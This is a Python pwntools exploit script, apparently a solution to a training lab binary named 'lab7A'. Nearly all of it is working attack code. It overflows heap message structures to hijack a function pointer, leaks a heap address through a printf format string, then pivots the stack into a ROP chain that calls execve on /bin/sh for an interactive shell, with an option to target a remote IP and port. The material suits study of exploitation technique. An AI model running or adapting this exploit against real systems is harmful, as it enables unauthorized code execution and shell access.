#!/usr/bin/env python2

from pwn import *

# == How to use ==
# python remote.py LOCAL
# python remote.py REMOTE IP=127.0.0.1 PORT=1337

settings = {

    # Path to binary
    "binary"        : "./lab7A",

    # Path to custom libc
    "libc"          : None,
}

def create_message(message, length):
    p.sendlineafter("Enter Choice: ", "1")
    p.sendlineafter("Enter data length: ", str(length))
    p.sendafter("Enter data to encrypt: ", message)

def edit_message(index, message):
    p.sendlineafter("Enter Choice: ", "2")
    p.sendlineafter("Input message index to edit: ", str(index))
    p.sendafter("Input new message to encrypt: ", message)

def delete_message(index):
    p.sendlineafter("Enter Choice: ", "3")
    p.sendlineafter("Input message index to destroy: ", str(index))

def print_message(index):
    p.sendlineafter("Enter Choice: ", "4")
    p.sendlineafter("Input message index to print: ", str(index))
    p.recvuntil("-----------------------------------------")
    xor_pad = p.recvuntil("\n\n").replace("\n", "")

    p.recvuntil("-----------------------------------------")
    encrypted = p.recvuntil("\n\n").replace("\n", "")

    return unhex(xor_pad), unhex(encrypted)

# Exploit here
def exploit():

    # Message #0 (Overflow message->msg_size with 2 'A's)
    create_message("A" * 0x82, 0x82)

    # Dummy message - to be overwritten
    create_message("Dummy", 0x5)

    # Message #2 (Overflow message->msg_size with 2 'A's)
    create_message("A" * 0x82, 0x82)

    # Dummy message - to be overwritten
    create_message("Dummy", 0x5)

    # Edit messsage #2 to overflow dummy with printf
    payload = ""
    payload += "A" * (0x80 + 0x4) # message->msg + message->msg_size overflow
    payload += "B" * 0x8 # next heap chunk overwrite
    payload += p32(binary.symbols['printf']) # next_message->func = printf
    payload += "...%20$p..."
    edit_message(2, payload)

    # Edit message #0 to overflow dummy with print_index
    payload = ""
    payload += "A" * (0x80 + 0x4) # message->msg + message->msg_size overflow
    payload += "B" * 0x8 # next heap chunk overwrite
    payload += p32(binary.symbols['print_index']) # next_message->func = printf
    edit_message(0, payload)

    # We do this to leak an address on the heap
    p.sendlineafter("Enter Choice: ", "4")
    p.sendlineafter("Input message index to print: ", "1")
    p.sendlineafter("Input message index to print: ", "3")

    p.recvuntil("...")
    heap = int(p.recvuntil("...", drop=True), 16) - 0x1af0
    log.info("Heap : {}".format(hex(heap)))

    # Edit messsage #0 to overflow dummy and pivot to heap
    rop_chain = []
    rop_chain += []
    rop_chain += [0x080e76ad] # pop ecx
    rop_chain += [0x0]
    rop_chain += [0x0807030a] # pop edx
    rop_chain += [0x0]
    rop_chain += [0x080481c9] # pop ebx
    rop_chain += [heap + 0x001af4] # /bin/sh
    rop_chain += [0x080bd226] # pop eax
    rop_chain += [0xb]
    rop_chain += [0x08048ef6] # int 0x80

    payload = ""
    payload += "A" * (0x80 + 0x4) # message->msg + message->msg_size overflow
    payload += "B" * 0x8 # next heap chunk overwrite
    payload += p32(0x080bd486) # next_message->func = mov esp, ecx; ret
    payload += "/bin/sh\x00" # Used by rop chain
    payload += flat(rop_chain) # next_message->xor_key overwrite
    edit_message(0, payload)

    ropchain = []
    ropchain += [0x08095e00] # pop ebx; pop esi; pop edi
    ropchain += [0x1]
    ropchain += [0x1]
    ropchain += [0x1]
    ropchain += [0x1]
    ropchain += [0x080bd1d6]
    ropchain += [heap + 0x1afc]

    p.sendlineafter("Enter Choice: ", "4")
    p.sendlineafter("Input message index to print: ", "1" + flat(ropchain))


    p.interactive()


# Initial setup
if __name__  == "__main__":

    binary = ELF(settings['binary'])
    p = None

    if settings['libc']:
        binary.libc = ELF(settings['libc'])


    if args['LOCAL']:
        p = process(binary.path)

    if args['REMOTE']:
        if not all([args.IP, args.PORT]):
            log.warning("Missing IP/PORT arguments.")
            exit()

        p = remote(args.IP, int(args.PORT))

    if not p:
        log.warning("Missing LOCAL/REMOTE argument.")
        exit()

    pause()
    exploit()
